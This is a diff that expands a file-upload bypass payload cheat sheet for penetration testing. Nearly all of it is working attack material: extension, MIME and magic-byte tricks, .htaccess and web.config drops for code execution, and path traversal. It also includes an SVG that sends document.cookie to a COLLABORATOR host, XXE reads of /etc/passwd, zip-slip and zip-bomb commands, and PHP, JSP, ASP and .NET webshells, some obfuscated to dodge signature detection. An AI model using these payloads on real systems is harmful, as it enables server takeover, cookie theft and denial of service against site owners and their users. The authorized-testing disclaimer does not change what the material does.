@@ -1,171 +1,313 @@
-# File Upload Bypass Payloads
+# File Upload Bypass — THE COMPLETE MATRIX (2026)
+# Author: MD MAHABUBUR RAHMAN  —  Authorized targets only.
+#
+# Organization:
+#   1  Extension ladder (the #1 path to RCE)
+#   2  Content-Type / MIME spoof
+#   3  Magic-byte / polyglot
+#   4  Filename tricks (dots, null, case, unicode, control chars)
+#   5  Config-file drop (.htaccess / .user.ini / web.config)
+#   6  Path traversal in filename
+#   7  Stored XSS (SVG / HTML / OOXML)
+#   8  XXE / SSRF via parsers
+#   9  Zip-slip / zip-bomb / DoS
+#  10  Deserialization / phar
+#  11  Webshells (authorized PoC)
+#  12  Post-upload checks & execution confirm
+#  ->  WAF/AV evasion lives in waf-bypass-payloads.txt
 
-## 1. EXTENSION BYPASS LIST (avoid .php/.jsp filter)
+## ── 1. EXTENSION LADDER ──────────────────────────────────────────────
+# Try in order; the server executes the LAST handler (or first per Apache Rules).
+shell.php
+shell.php5
+shell.php7
+shell.phtml
+shell.phar
+shell.pht
+shell.php3
+shell.php4
+shell.php8
+shell.pHp
+shell.PhP
+shell.php%00.png           # null byte (legacy PHP/Apache)
+shell.php.                 # trailing dot (Windows/Apache parse)
+shell.php. .              # trailing dot + space
+shell.php%20               # trailing space
+shell.php%0a               # trailing newline
+shell.php\t                # trailing tab
+shell.pHp5
+shell.jpg.pHp5
 
-### Double extensions
-```
+# Double / chained extensions
 shell.php.jpg
 shell.php.png
 shell.php.txt
-shell.php%00.png
-shell.asp%00.jpg     (null byte - old ASP)
-shell.aspx%00.png
-```
-
-### Case / polyglot
-```
-Shell.PHP
-shell.PhP
-shell.php5
-shell.phtml
-shell.phar
-shell.php7
-shell.php
-shell.pht
-shell.php.     (trailing dot)
-shell.php%20
-shell.php%0a
-shell.php%2e
 shell.jpg.php
-shell.php%00.gif
-shell.php::$DATA        (Windows NTFS stream)
-shell.php::$DATA.jpg
-shell.php .jpg          (space)
-```
-
-### Allowlist bypass via leading image name
-```
-shell.jpg.php
-shell.jpeg.php5
+shell.jpg.php5
 shell.gif.phtml
 shell.pdf.php
-```
+shell.png.php.jpg
+shell.php.jpg.png
+shell.php.wsdl.jpg
+shell.jpg/php             # Apache per-dir mod_php trick (legacy)
 
-### Server interprets secondary extension
-```
-.php5 .phtml .phar .pht .php3 .php4 .php7 .inc
-.asp .aspx .asmx .ashx .asa .cer .cdx .cshtml .jsp .jspx .jrw .jsw .war
-.shtml .shtm .stm               (SSI - exec command)
-```
+# Alternate PHP handler aliases / engines
+shell.png (with .htaccess AddType)   # see section 5
+shell.jpeg (with .user.ini prepend)
 
-## 2. CONTENT-TYPE / MIME SPOOFING
-```
-Content-Type: image/png       (file.ext=shell.php but CT png - some servers only check CT)
+# ASP / ASPX / .NET-Like
+shell.asp
+shell.aspx
+shell.ashx
+shell.asmx
+shell.asa
+shell.cer
+shell.cdx
+shell.cshtml
+shell.aspx;.jpg
+shell.aspx::$DATA
+
+# Java / JSP
+shell.jsp
+shell.jspx
+shell.jsw
+shell.jrw
+shell.war
+shell.jar
+
+# SSI / Other server-side
+shell.shtml
+shell.shtm
+shell.stm
+shell.cgi
+shell.pl
+shell.py
+shell.sh
+
+# Case-insensitive bypass flavours
+Shell.PHP
+shell.pHp
+SHELL.PHP
+shell.JSP
+shell.Aspx
+
+## ── 2. CONTENT-TYPE / MIME SPOOF ────────────────────────────────────
+# Many servers validate only the multipart Content-Type, not the real file.
+# Send the payload with these headers/as values:
+Content-Type: image/png
 Content-Type: image/jpeg
 Content-Type: image/gif
-Content-Type: multipart/form-data; boundary=...
-```
-With body starting with magic bytes:
-```
-GIF89a;<?php system($_GET['cmd']); ?>          (gif signature)
-\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>  (JPEG signature)
-\x89PNG\r\n\x1a\n<?php ... ?>                   (PNG signature)
-<?php system($_GET['cmd']); ?>
-```
+Content-Type: image/x-png
+Content-Type: application/octet-stream     # often let through
+Content-Type: application/pdf
+Content-Type: text/plain
+Content-Type: multipart/form-data; boundary=----x
+# Some WAFs also check the per-part filename's MIME - fuzz both.
 
-## 3. MAGIC BYTE BYPASS (header-only checks)
-```
-# append PHP after valid header
-GIF89a
-<?php echo 'test';?>
+## ── 3. MAGIC BYTES & POLYGLOTS ──────────────────────────────────────
+# Server checks the file header (finfo/getimagesize). Prepend a signature:
+GIF89a;<?php system($_GET['c']); ?>
+\xff\xd8\xff\xe0<?php system($_GET['c']); ?>                 # JPEG
+\x89PNG\r\n\x1a\n<?php system($_GET['c']); ?>                # PNG
+%PDF-1.4\n<?php system($_GET['c']); ?>                       # PDF magic
 
-# exiftool injected comment → PHP executes in some parsers
-exiftool -Comment='<?php system($_GET["cmd"]); ?>' evil.jpg
-exiftool -Comment='<?php ?>' evil.png
-```
+# exiftool-injected polyglot (valid image + code)
+exiftool -Comment='<?php system($_GET["c"]); ?>' evil.jpg
+exiftool -Comment='<?php echo "POC"; ?>' evil.png
 
-## 4. FILENAME TRICK ROUND 2
-```
+# Minimal real PNG that still carries PHP tail (crafted binary):
+#   89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 ... then PHP at EOF
+# Used with LFI: ?page=uploads/x.png&c=id
+
+## ── 4. FILENAME TRICKS (round 2) ────────────────────────────────────
 shell.php%00.png
 shell.php%0d%0a.png
 shell.php%252e.png
+shell.php%2F
 shell.php/../../aa.png
 shell.php\u0000.png
-shell.%70hp.png
-file.php.png/xyz
-file.jpg;.php
-```
-Win-specific:
-```
-shell.php:=test.jpg
+shell.%70hp.png            # hex-encoded 'p'
+shell.p%68p
+file.php.png/xyz            # trailing path segment
+file.jpg;.php              # semicolon (Windows/.NET path parsing)
+shell.php?x=.png            # query trick in filename/multipart name
+shell.php#.png
+
+# Windows/NTFS specific
 shell.php::$DATA
+shell.php::$DATA.jpg
+shell.php:=test.jpg
 shell.phP
 shell.php%20.jpg
-```
+CON, PRN, AUX, NUL         # reserved device names (odd behavior)
+shell.php::$DATA
 
-## 5. EMBEDDED IMAGE XSS (stored XSS - always report)
-```xml
-<!-- SVG - top weapon: stored XSS wherever images upload -->
+# Unicode / NFKC
+shell.％70hp.png            # fullwidth '%' bypasses some filters
+%70%68%70.png              # percent-encoded extension
+shell.php%EF%BC%8E.png     # fullwidth dot / normalization mismatch
+shell.php＋.png            # fullwidth '+' as substring longer check
+
+# Control / whitespace inside the name
+shell.php.\x0a.png
+shell.php\x20
+shell.php\n.jpg
+shell.php\t.jpg
+
+## ── 5. CONFIG-FILE DROP (silent RCE on writable parents) ────────────
+# Only works if the uploaded file lands in a path where Apache/NGINX reads
+# these configs (e.g. uploads dir on a shared host, docroot misuse).
+.htaccess:
+  AddType application/x-httpd-php .png
+  AddHandler application/x-httpd-php .jpg
+  <FilesMatch ".*\.ph.*"> SetHandler php5-script </FilesMatch>
+  php_flag engine on
+.user.ini:
+  auto_prepend_file = shell.png.png
+  auto_append_file  = shell.png.png
+web.config (IIS):
+  <configuration><system.webServer><handlers>
+    <add name="x" path="*.png" verb="*" type="System.Web.UI.PageHandlerFactory" />
+  </handlers></system.webServer></configuration>
+# Upload the config + upload "shell.png" containing PHP -> LFI/prepend executes it.
+
+## ── 6. PATH TRAVERSAL IN FILENAME ──────────────────────────────────
+../../../../var/www/html/shell.php
+../../../../etc/passwd
+....//....//....//var/www/html/shell.php
+..%2f..%2f..%2f..%2fvar/www/html/shell.php
+..%2e%2f..%2e%2f..%2e%2f..%2e%2fshell.php
+%2e%2e%2f..%2f..%2f..%2fshell.php
+..%252f..%252f..%252fshell.php       # double-encoded
+/../shell.php
+..../..../..../shell.php              # OS translates ..../
+..\\..\\..\\shell.php                # backslash (Windows)
+
+## ── 7. STORED XSS (SVG / HTML / OOXML) ─────────────────────────────
+# SVG — top weapon for stored XSS in any avatar/media upload
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
   <text y="20">XSS</text>
 </svg>
-```
-```svg
+
 <svg xmlns="http://www.w3.org/2000/svg">
-  <foreignObject width="500" height="500">
+  <foreignObject width="500" height="500" onload="alert(1)">
     <div xmlns="http://www.w3.org/1999/xhtml">
       <script>alert(document.domain)</script>
     </div>
   </foreignObject>
 </svg>
-```
-```html
-<!-- uploaded .html pages served as-is = stored XSS -->
+
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>fetch('//COLLABORATOR/?c='+document.cookie)</script>
+</svg>
+
+<svg
+  xmlns="http://www.w3.org/2000/svg"
+  xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="http://COLLABORATOR/x" width="1" height="1"/>
+</svg>
+#   ^ fire-and-forget blind SSRF/stored-exfil probe
+
+# Uploaded .html served as-is -> full stored XSS
 <!DOCTYPE html><script>alert(document.domain)</script>
-```
+# .svgz, .xhtml, .xml with embedded script also worth trying
 
-## 6. ZIP-BOMB / DoS upload
-```
-# create huge zip: zip -0 -r bomb.zip bigfile         (marked as 100%)
-# uploading zip that expands hugely = DoS (report as resource abuse)
-```
+# Bypass CSP / img-src blocked with svg as data-uri (if app caches it)
+data:image/svg+xml,<svg onload="alert(1)">
 
-## 7. WEBSHELLS (for authorized tests)
-PHP (minimal):
-```
-<?php system($_GET['cmd']);?>
-```
-PHP (bypass for short tag/WAF):
-```
+## ── 8. XXE / SSRF VIA PARSERS ──────────────────────────────────────
+# SVG XXE
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="file:///etc/passwd"/>
+</svg>
+# DOCTYPE XXE (works when uploader feeds XML into a parser: fonts, meta, etc.)
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<x>&xxe;</x>
+# OOXML (docx/xlsx) — set [Content_Types].xml / document.xml entity
+#   -> read files / hit internal services -> SSRF via external DTD.
+
+## ── 9. ZIP-SLIP / ZIP-BOMB / DoS ──────────────────────────────────
+# Zip-slip: entry name with traversal -> extract writes outside dir
+../../../../tmp/rce.php
+..\..\..\..\tmp\rce.php
+%2e%2e%2f%2e%2e%2frce.php
+# Zip-bomb (marked ratio to evade size limits)
+zip -0 -r bomb.zip 10MB-bigfile
+zip -9 -r bomb.zip many-same-zeros
+# SVG expansion bomb ("billion laughs") via nested entities
+# Image decompression bomb for image parsers (CVE'd in some libs - check).
+# Report all DoS variants as resource abuse, not RCE.
+
+## ── 10. DESERIALIZATION / PHAR ────────────────────────────────────
+# If a .phar/.phar.jpg/.phar.png can be uploaded AND is included/stored,
+# phar:// wrapper + __destruct gadget = RCE (see Insecure_Deserialization dir).
+shell.phar
+shell.phar.png                  # magic bytes PNG + phar stub
+# Tika/Zero.py style: filename rewrite + phar deserialization.
+
+## ── 11. WEBSHELLS (authorized PoC only) ────────────────────────────
+# PHP minimal
+<?php system($_GET['c']);?>
+# PHP short-tag / WAF-dodge
 <?=`$_GET[0]`?>
 <?php @eval($_POST['x']);?>
-```
-JSP:
-```
+<?php assert($_POST['x']);?>
+<?php $_GET['a']($_GET['b']);?>           # callable gadget
+<?php @preg_replace('/.*/e',$_POST['x'],'');?>   # old /e (PHP <7)
+<?php include($_GET['f']);?>             # LFI proxy shell
+# Bypass common webshell signatures: no "eval", no "system" literal
+<?=$_='_'.c.'_';?>
+<?php $f='sy'.'stem';$f($_GET['c']);?>
+
+# JSP
 <% Runtime.getRuntime().exec(request.getParameter("c")); %>
-```
-ASP:
-```
+<% Runtime.getRuntime().exec(request.getParameter("c")); %>
+# ASP
 <% response.write(server.createobject("WSCRIPT.SHELL").exec("cmd /c "&request("c")).stdout.readall) %>
-```
-SFM (server-side include):
-```
+<%='<% execute request("c") %>'%>
+# SSI server-side include (executes if .shtml enabled)
 <!--#exec cmd="/bin/cat /etc/passwd"-->
-```
+<!--#include virtual="/etc/passwd"-->
+# .NET code-behind (uploaded + precompiled)
+<%@ Page Language="C#" %><% System.Diagnostics.Process.Start( Request["c"] ); %>
+# Multi-tool: use minimal echo to prove execution first
+<?php echo "POC-HASH-CONFIRM"; exit;?>
 
-## 8. TEST MATRIX QUICK REFERENCE
-| Goal | Payload |
-|------|---------|
-| Brand-new extension | `shell.phtml` |
-| MIME flip | `Content-Type: image/png` + `.php` suffix |
-| Magic byte | `GIF89a;<?php ...?>` |
-| Windows stream | `shell.php::$DATA` |
-| Control char | `shell.php` + tab/CR (`.php.\x0a.png`) |
-| Double ext | `x.jpg.php` (older filters stripped last ext) |
-| Stored XSS | `.svg` landed in an `<img>` viewer |
-| Path traversal | `../../../../var/www/html/shell.php` |
-
-## 9. POST-UPLOAD CHECKS
-```
-# Find real stored path from error/response JSON
-# If access works, try requesting it directly:
-GET /uploads/<year>/<month>/shell.php?cmd=id
+## ── 12. POST-UPLOAD CHECKS & EXECUTION CONFIRM ─────────────────────
+# 1) Find the real stored path (response JSON / error / CDN URL).
+# 2) Request it directly with a harmless command to PROVE execution:
+GET /uploads/2026/01/shell.php?c=id
 GET /wp-content/uploads/2026/01/shell.php?cmd=id
 GET /upload/shell.php?0=id
-```
-Any 200 + command output = full RCE. Report with curl PoC.
+GET /files/<id>                    # IDOR guessable id
+# 3) If the extension won't execute, pivot:
+#    - .htaccess / .user.ini drop (section 5)
+#    - LFI to include a polyglot (section 3)
+#    - stored XSS via SVG (section 7)
+# 4) Confirm not a static fallthrough: grep the BODY for your echo string.
+
+## ── QUICK REFERENCE MATRIX ─────────────────────────────────────────
+| Goal                | Payload / method                       |
+|---------------------|------------------------------------------|
+| New extension       | shell.phtml → .phar → .pht → .php7       |
+| MIME flip           | Content-Type: image/png + .php suffix     |
+| Magic byte          | GIF89a;<?php ...?> at first bytes        |
+| Windows stream      | shell.php::$DATA                         |
+| Control char        | shell.php.\\x0a.png / tab / space          |
+| Double ext          | x.jpg.php (older filters strip last)     |
+| Full traversal      | ../../../../var/www/html/shell.php       |
+| Silent RCE          | .htaccess AddType .png → php             |
+| Stored XSS          | .svg in an <img> viewer                  |
+| SSRF               | SVG <image xlink:href="http://..." >     |
+| XXE                | SVG/OOXML external entity -> file:///    |
+| Zip-slip           | entry ../../../../tmp/evil.php           |
+| Phar                | shell.phar with gadget                   |
+| Execution proof     | echo-based shell + curl body grep        |
 
 ## DISCLAIMER
-Uploading webshells to a system you don't own is a crime. Only upload proof-of-concept test files (e.g. `<?php echo "poc";?>` then delete) on authorized targets, or use a harmless `test.txt` first.
+All material is for authorized security testing / bug bounty only. Use
+harmless PoC payloads (echo a token), then delete them. Attacking systems
+you don't own is illegal.
